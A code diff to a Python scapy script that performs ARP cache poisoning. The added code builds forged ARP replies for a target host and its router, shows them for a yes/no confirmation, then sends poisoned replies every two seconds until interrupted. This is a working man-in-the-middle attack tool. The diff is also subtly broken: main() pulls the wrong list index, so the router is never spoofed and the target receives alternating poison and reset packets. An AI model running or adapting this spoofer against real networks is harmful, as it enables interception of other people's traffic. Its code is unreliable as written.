@@ -3,6 +3,8 @@ import scapy.all as scapy
 import subprocess
 import argparse
 import re
+import time
+import sys
 
 def get_input():
     parser = argparse.ArgumentParser()
@@ -50,16 +52,43 @@ def get_mac_addresses(router_ip,target_ip,scan_result_dict):
 def prepare_packets(target_ip,target_mac,router_ip,router_mac):
     target_packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=router_ip)
     router_packet = scapy.ARP(op=2,pdst=router_ip,hwdst=router_mac,psrc=target_ip)
-    print("-------------------------------------------------")
-    print("Target Packet")
-    print("-------------------------------------------------")
-    print(target_packet.show())
-    print(target_packet.summary())
-    print("-------------------------------------------------")
-    print("Router Packet")
-    print("-------------------------------------------------")
-    print(router_packet.show())
-    print(router_packet.summary())
+    target_reset_packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=router_ip,hwsrc=router_mac)
+    router_reset_packet = scapy.ARP(op=2,pdst=router_ip,hwdst=router_mac,psrc=target_ip,hwsrc=target_mac)
+    packet_list = [
+            {"name":"target_packet","packet":target_packet},
+            {"name":"target_reset_packet","packet":target_reset_packet},
+            {"name":"router_packet","packet":router_packet},
+            {"name":"router_reset_packet","packet":router_reset_packet}
+            ]
+    return(packet_list)
+
+def get_confirmation(packet_list):    
+    for p in packet_list:
+        print("-------------------------------------------------")
+        print(p["name"])
+        print("-------------------------------------------------")
+        print(p["packet"].show())
+        print(p["packet"].summary())
+    while True:
+        response = input("[+] Proceed using the above packets? [y/n]: ")
+        if response == "y":
+            return()
+        elif response == "n":
+            sys.exit("[+] Exiting programme.")
+        else:
+            print("[-] Please enter a valid response. Use 'y' to proceed and 'n' to cancel.")
+
+def send_packets(target_packet,router_packet):
+    total_packets_sent = 0
+    try:
+        while True:
+            scapy.send(target_packet,verbose=False)
+            scapy.send(router_packet,verbose=False)
+            total_packets_sent += 2
+            print("\r[+] Total packets sent: " + str(total_packets_sent),end="")
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\r[+] Exiting programme.")
 
 def main():
     interface = get_input()
@@ -70,6 +99,12 @@ def main():
     mac_addresses = get_mac_addresses(router_ip,target_ip,scan_result_dict)
     router_mac = mac_addresses[0]
     target_mac = mac_addresses[1]
-    prepare_packets(target_ip,target_mac,router_ip,router_mac)
+    packet_list = prepare_packets(target_ip,target_mac,router_ip,router_mac)
+    get_confirmation(packet_list)
+    target_packet = packet_list[0]["packet"]
+    router_packet = packet_list[1]["packet"]
+    target_reset_packet = packet_list[2]["packet"]
+    router_reset_packet = packet_list[3]["packet"]
+    send_packets(target_packet,router_packet)
 
 main()
